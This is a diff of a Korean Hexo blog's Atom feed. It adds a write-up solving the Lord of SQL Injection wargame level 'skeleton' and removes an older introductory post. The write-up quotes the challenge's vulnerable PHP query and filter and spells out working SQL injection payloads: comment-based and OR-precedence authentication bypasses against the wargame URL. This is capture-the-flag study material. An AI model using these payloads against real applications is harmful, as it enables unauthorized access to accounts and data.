@@ -6,7 +6,7 @@
   <link href="/feed.xml" rel="self"/>
   
   <link href="https://www.jslee.me/"/>
-  <updated>2019-08-20T11:08:10.063Z</updated>
+  <updated>2019-08-21T14:53:12.356Z</updated>
   <id>https://www.jslee.me/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Lord of SQL Injection Write Up No.10 Skeleton</title>
+    <link href="https://www.jslee.me/2019/08/21/los-write-up-10-skeleton/"/>
+    <id>https://www.jslee.me/2019/08/21/los-write-up-10-skeleton/</id>
+    <published>2019-08-21T14:35:49.000Z</published>
+    <updated>2019-08-21T14:53:12.356Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 10번 skeleton 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p>SQL Injection을 통해 필요하지 않은 조건절을 무력화시킬 수 있는지 확인한다.</p><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>skeleton 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_skeleton where id='guest' and pw='&#123;$_GET[pw]&#125;' and 1=0"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"skeleton"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET방식으로 <code>pw</code>를 받고, <code>pw</code>에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_skeleton where id='guest' and pw='&#123;$_GET[pw]&#125;' and 1=0"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"skeleton"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>id</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>id</code>에 <code>&quot;admin&quot;</code>이라는 값이 들어있음’이다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p>주석 처리 이용</p><p>MySQL에서는 <code>#</code>, <code>-- -</code>와 같은 주석문자에 이어져 나오는 문자열을 모두 무시한다.</p><p>따라서 입력값으로 <code>&#39; or id=&#39;admin&#39;%23</code>, <code>&#39; or id=&#39;admin&#39;-- -</code> 과 같이 마지막에 주석을 넣은 값을 넣으면 삽입된 문자열까지만 처리하여 문제가 풀리게 된다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/skeleton_8d9cbfe1efbd44cfbbdc63fa605e5f1b.php?pw=&apos; or id=&apos;admin&apos;%23</span><br></pre></td></tr></table></figure><p>URL Encoding 후 공백은 %20, #은 %23, ‘는 %27이 된다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/skeleton_8d9cbfe1efbd44cfbbdc63fa605e5f1b.php?pw=&apos; or id=&apos;admin&apos;-- -</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_skeleton <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'guest'</span> <span class="keyword">and</span> pw=<span class="string">''</span> <span class="keyword">or</span> <span class="keyword">id</span>=<span class="string">'admin'</span><span class="comment">#' and 1=0</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_skeleton <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'guest'</span> <span class="keyword">and</span> pw=<span class="string">''</span> <span class="keyword">or</span> <span class="keyword">id</span>=<span class="string">'admin'</span><span class="comment">-- -' and 1=0</span></span><br></pre></td></tr></table></figure></li><li><p>논리 연산 우선순위 이용</p><p>MySQL에서 WHERE절의 논리 연산같은 경우 AND연산이 OR연산보다 우선 처리된다.</p><p>따라서 입력값으로 <code>&#39; or id=&#39;admin&#39; or &#39;1&#39;=&#39;1</code> 과 같은 값을 넣으면 <code>id=&#39;guest&#39;</code>인 행의 <code>pw</code>가 빈 문자열이 아닌 경우 논리 연산 후 결국 <code>id=&#39;admin&#39;</code>인 행을 불러오는 SQL문이 되어 문제가 풀리게 된다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/skeleton_8d9cbfe1efbd44cfbbdc63fa605e5f1b.php?pw=&apos; or id=&apos;admin&apos; or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_skeleton <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'guest'</span> <span class="keyword">and</span> pw=<span class="string">''</span> <span class="keyword">or</span> <span class="keyword">id</span>=<span class="string">'admin'</span> <span class="keyword">or</span> <span class="string">'1'</span>=<span class="string">'1'</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">0</span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;
+
+&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
+&lt;p&gt;이 문서에서는 Lord of SQL Injection 10번 skeleton 문제에 대하여 정리한다.&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
+    
+    
+      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
+    
+      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
+    
+  </entry>
   
   <entry>
     <title>Lord of SQL Injection Write Up No.9 Vampire</title>
@@ -523,30 +550,6 @@
     
     
       <category term="CentOS" scheme="https://www.jslee.me/tags/CentOS/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>블로그 시작!</title>
-    <link href="https://www.jslee.me/2019/08/01/start-blog/"/>
-    <id>https://www.jslee.me/2019/08/01/start-blog/</id>
-    <published>2019-08-01T14:37:51.000Z</published>
-    <updated>2019-08-01T15:57:49.000Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="블로그를-또-다시-만들다"><a href="#블로그를-또-다시-만들다" class="headerlink" title="블로그를 또 다시 만들다"></a>블로그를 또 다시 만들다</h2><blockquote><p>항상 만들고 방치해서 잊혀진 나의 블로그들<br>이번에는 진짜 잘 해보자 ㅜㅜ</p></blockquote><p>블로그를 만들었다.</p><p>잠자는 네이버 블로그와 NAS에서 죽은 워드프레스와<br>“이젠 정말 제대로 해보자!”며 만든 티스토리 블로그를 뒤로 하고…</p><a id="more"></a><p>사실 Notion을 알기 전에는 정보를 거의 오프라인에서만 기록했고<br>얼마 안 됐지만 그 후에는 Notion에 정리하고 있었기 때문에<br>블로그를 단순히 기록하는 곳이라고 생각하던 나는 그동안 블로그의 필요성을 전혀 느끼지 못했다.</p><p>그런데 최근 GitHub에 관심이 생겨서 이것저것 찾아보던 중에<br>오래전에 흘려들었던 “GitHub Pages를 이용한 블로그 구축”에 대해 자세히 알게 되었다.</p><p><strong>블로그 활동을 하는 것이 모두 GitHub에 커밋으로 남는다니..!</strong><br>1일 1포스트와 1일 1커밋을 동시에?!?! 라는 생각으로 블로그 만들기에 바로 착수했다.</p><h3 id="Jekyll을-이용한-블로그-구축-시도"><a href="#Jekyll을-이용한-블로그-구축-시도" class="headerlink" title="Jekyll을 이용한 블로그 구축 시도"></a>Jekyll을 이용한 블로그 구축 시도</h3><p>처음에는 구글에 “GitHub 블로그”라고 검색해서 뜨는<br><a href="https://dreamgonfly.github.io/2018/01/27/jekyll-remote-theme.html" target="_blank" rel="noopener">쉽고 빠르게 수준 급의 GitHub 블로그 만들기</a> 같은 글을 보고<br>Jekyll과 minimal-mistakes 테마를 이용해서 블로그를 구성했다.</p><p>근데 그 날 밤에 게임을 하다가 친구에게 조언을 받았다.</p><blockquote><p>친구: 아직도 Jekyll로 블로그 만드는 흑우가 있다?<br>나: GitHub 블로그는 다 Jekyll로 만드는 거 아니여?<br>친구: ;; 구글에 Hexo 검색 ㄱ</p></blockquote><p>Jekyll은 Ruby 기반인데 반해 Hexo는 Node.js 기반이었다.<br>나는 Ruby는 하나도 모르지만 Node.js는 조금 해봤기 때문에<br>그걸 알고있는 친구의 조언을 감사히 받아들여 Hexo로 다시 블로그를 구축하기 시작했다.</p><h3 id="Hexo를-이용한-블로그-구축"><a href="#Hexo를-이용한-블로그-구축" class="headerlink" title="Hexo를 이용한 블로그 구축"></a>Hexo를 이용한 블로그 구축</h3><p><a href="https://hexo.io/ko/" target="_blank" rel="noopener">Hexo 공식 사이트</a>와 Hexo로 만들어진 믿음직한 블로그의 <a href="https://marv-0.github.io/2018/05/02/Hexo%20+%20Github%20%EB%B8%94%EB%A1%9C%EA%B7%B8%20%EA%B5%AC%EC%B6%95/" target="_blank" rel="noopener">Hexo + Github 블로그 구축</a> 글을 참고해서<br>기본적인 틀과 Jenkins를 이용하여 자동으로 Deploy 하는 구조는 잘 만들었다.</p><p>그런데 진짜 작업은 따로 있었으니… 바로 <strong>테마 적용 및 설정</strong>이었다.</p><h4 id="Hexo에-NexT-테마-입히기"><a href="#Hexo에-NexT-테마-입히기" class="headerlink" title="Hexo에 NexT 테마 입히기"></a>Hexo에 NexT 테마 입히기</h4><p><a href="https://theme-next.org/" target="_blank" rel="noopener">NexT 테마 공식 사이트</a>를 참고하여 NexT 테마를 설치하고 설정하였다.<br>여기서는 한 줄로 정리할 수 있지만 이 작업에 거의 8시간은 쓴 것 같다.</p><p>그래도 Disqus를 이용한 댓글 기능, Algolia를 이용한 검색 기능 등<br>사실상 Hexo와 NexT 테마에서 기본적으로 지원하는 기능들은 거의 다 쓸 수 있게 된 것 같아서 기분이 좋다.<br>이와 관련한 자세한 내용은 Hexo + NexT / Jenkin / GitHub Pages를 이용한 블로그 구축을 주제로<br>따로 정리를 해서 포스팅 할 예정이다.</p><h2 id="앞으로-할-일"><a href="#앞으로-할-일" class="headerlink" title="앞으로 할 일"></a>앞으로 할 일</h2><ul><li>마크다운 문법 다시 학습</li><li>1일 1포스트 (1일 1커밋) 이상!<ul><li>이전에 Notion 등에 정리했던 기록 중 공유할 만한 내용</li><li>알고 있거나 새로 알게 된 정보 중 공유할 만한 내용</li></ul></li><li>블로그 개인화<ul><li>테마 부분 수정</li><li>기능, 페이지 추가, 수정 등</li></ul></li></ul>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;블로그를-또-다시-만들다&quot;&gt;&lt;a href=&quot;#블로그를-또-다시-만들다&quot; class=&quot;headerlink&quot; title=&quot;블로그를 또 다시 만들다&quot;&gt;&lt;/a&gt;블로그를 또 다시 만들다&lt;/h2&gt;&lt;blockquote&gt;
-&lt;p&gt;항상 만들고 방치해서 잊혀진 나의 블로그들&lt;br&gt;이번에는 진짜 잘 해보자 ㅜㅜ&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;블로그를 만들었다.&lt;/p&gt;
-&lt;p&gt;잠자는 네이버 블로그와 NAS에서 죽은 워드프레스와&lt;br&gt;“이젠 정말 제대로 해보자!”며 만든 티스토리 블로그를 뒤로 하고…&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="잡담" scheme="https://www.jslee.me/categories/%EC%9E%A1%EB%8B%B4/"/>
-    
     
   </entry>
   
